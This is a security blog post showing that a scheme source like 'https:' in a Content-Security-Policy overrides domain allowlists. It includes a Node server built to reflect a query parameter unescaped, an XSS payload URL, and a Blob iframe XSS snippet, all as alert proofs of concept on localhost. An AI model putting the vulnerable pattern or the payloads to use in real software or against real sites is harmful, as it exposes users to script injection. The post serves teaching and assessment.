---
title: "Schemes are CSP&#8217;s Weakest Link"
date: 2025-09-02T21:33:00
categories: ["Security"]
tags: ["Security", "Web"]
image: /assets/uploads/2024/09/csp-scheme.jpg
---

A CSP is the seatbelt for client-side attacks like Cross-Site Scripting and Clickjacking. It is really common to find a CSP which allows loading of resources only from specific domains, in order to limit the attack surface. But why use schemes?

Based on W3’s CSP page, in `chapter 2.3.1`. Source Lists, there is the schemes explanation, which is:

> > > > > ```
> > > > > Schemes such as https: (which matches any resource having the specified scheme)
> > > > > ```

I had seen in many occasions a scheme like `https:` in one of my assessments, but in my ignorance I never bothered to investigate further, since I believed that it instructs the browser to allow the loading of resources only when coming from a secure website, while respecting the domain names specified. I was DAMN wrong. The scheme instructs the browser to accept ALL connections from websites using https, bypassing any other restriction in place.

In order to test this, i set up 2 records in my localhost, one called `localallow.com` and another one `localdeny.com`. The idea was to allow only the localallow.com domain in my CSP and add a scheme to see how it will go. To do that, i set up a basic HTTPS web server using node. There is a page called `example.js`, which just servers a simple JS file.

```
const https = require('https');
const fs = require('fs');
const path = require('path');
const url = require('url');

const hostname = '127.0.0.1';
const port = 443;

const options = {
    key: fs.readFileSync(path.resolve(__dirname, './private.key')),
    cert: fs.readFileSync(path.resolve(__dirname, './certificate.crt')),
};

const server = https.createServer(options, (req, res) => {
    const parsedUrl = url.parse(req.url, true);
    const message = parsedUrl.query.message || 'No message provided';
    res.statusCode = 200;

    if (req.url === '/example.js') {
        res.setHeader('Content-Type', 'application/javascript')
        res.end(`alert('XSS');`);
    } else {
        res.setHeader('Content-Security-Policy', "default-src 'self'; script-src 'self' https://localallow.com; style-src 'self'; img-src 'self' data:; font-src 'self'; connect-src 'self'; frame-ancestors 'none'; base-uri 'self'; form-action 'self'")

        res.end(`<html>
            <body>
              <p>Your message is: ${message}</p>
            </body>
            </html>`);
    }
});

server.listen(port, hostname, () => {
    console.log(`Server running at https://${hostname}:${port}/`);
});
```

In every page loaded, the server returns the content passed as part of the `message` argument. This argument is user controlled, so we have this wonderful vulnerability called XSS. So, all somebody had to do, was load the script from the `localallow.com` domain, since it allowed. The final URL would look like this:

```
https://localhost/?message=%3Cscript%20src=%22https://localallow.com/example.js%22%3E%3C/script%3E
```

[![XSS from a trusted source script](/assets/uploads/2024/09/Screenshot-2024-09-02-at-23.12.58.png)](/assets/uploads/2024/09/Screenshot-2024-09-02-at-23.12.58.png)

XSS from localallow.com

When the page loads, the payload triggers, without any issues. With the current CSP, in case we try to execute the script from `localdeny.com`, the browser should block the loading of the script.

[![CSP blocks the script execution](/assets/uploads/2024/09/Screenshot-2024-09-02-at-23.14.24.png)](/assets/uploads/2024/09/Screenshot-2024-09-02-at-23.14.24.png)

CSP blocks the untrusted domain! Good job CSP!

And this was exactly as we planned. But what will happen if somebody added a scheme to the CSP? The updated CSP will look like this:

```
default-src 'self'; script-src 'self' https: https://localallow.com; style-src 'self'; img-src 'self' data:; font-src 'self'; connect-src 'self'; frame-ancestors 'none'; base-uri 'self'; form-action 'self'
```

Now let’s reload the same page, and see what will happen.

[![Scheme discards every CSP configuration](/assets/uploads/2024/09/Screenshot-2024-09-02-at-23.10.27.png)](/assets/uploads/2024/09/Screenshot-2024-09-02-at-23.10.27.png)

JavaScript loaded from an untrusted domain

The script executes although the domain `localdeny.com` is not listed in the list of domains allowed. And this bring the question. WHY?

Finally, in case the application allows different directives like `data:` or `blob:`, those also can be used for XSS attacks, like by passing an SVG data field to an image `<img src="data:image/svg+xml;base64,..." />` or by creating a blob object and passing it to an iframe.

```
let maliciousBlob = new Blob(["<script>alert('XSS');</script>"], { type: 'text/html' });
let blobURL = URL.createObjectURL(maliciousBlob);
document.body.innerHTML = `<iframe src="${blobURL}"></iframe>`;
```

Of course, in order to exploit those, `inline-script` should be allowed, but this is extremely common to find in CSPs.
